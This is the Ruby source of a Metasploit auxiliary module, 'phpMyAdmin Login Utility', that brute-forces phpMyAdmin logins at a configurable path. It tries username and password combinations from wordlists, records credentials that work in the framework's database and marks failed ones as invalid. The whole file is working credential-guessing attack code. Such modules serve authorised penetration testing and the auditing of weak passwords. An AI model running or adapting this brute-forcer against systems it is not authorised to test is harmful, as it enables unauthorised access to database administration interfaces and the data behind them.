require 'msf/core'
require 'metasploit/framework/login_scanner/php_myadmin'
require 'metasploit/framework/credential_collection'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})

    super(update_info(info,
      'Name'           => 'phpMyAdmin Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to a phpMyAdmin interface
      },
      'Author'         =>
        [
          'hdelval', # original contributor
          'void_in'  # help with dev and cleanup
        ],
      'References'     =>
        [
          ['CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'RPORT'      => 80
        }
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path of the phpMyAdmin interface', '/phpmyadmin/'])
      ], self.class)

  end

  def scanner(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    login_scanneur = Metasploit::Framework::LoginScanner::PhpMyAdmin.new(
      configure_http_login_scanner(
        host:               ip,
        uri:                datastore['TARGETURI'],
        port:               datastore['RPORT'],
        cred_details:       cred_collection,
        stop_on_success:    datastore['STOP_ON_SUCCESS'],
        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5
      ))

    @scanner ||= lambda {
      cred_collection
      return login_scanneur
    }.call
  end


  def report_good_cred(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: (ssl ? 'https': 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: result.status,
      proof: result.proof
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def report_bad_cred(ip, rport, result)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      public: result.credential.public,
      private: result.credential.private,
      realm_key: result.credential.realm_key,
      realm_value: result.credential.realm,
      status: result.status,
      proof: result.proof
    )
  end


  # Attempts to login
  def bruteforce(ip)
    scanner(ip).scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential}'")
        report_good_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute(:level => :verror, :ip => ip, :msg => result.proof)
        end
        report_bad_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'")
        end
        report_bad_cred(ip, rport, result)
      end
    end
  end

  # Start here
  def run_host(ip)
    scanneur = scanner(ip)
    unless scanneur.check_setup
      print_brute(:level => :error, :ip => ip, :msg => 'Target is not phpMyAdmin')
      return
    end

    bruteforce(ip)
  end
end

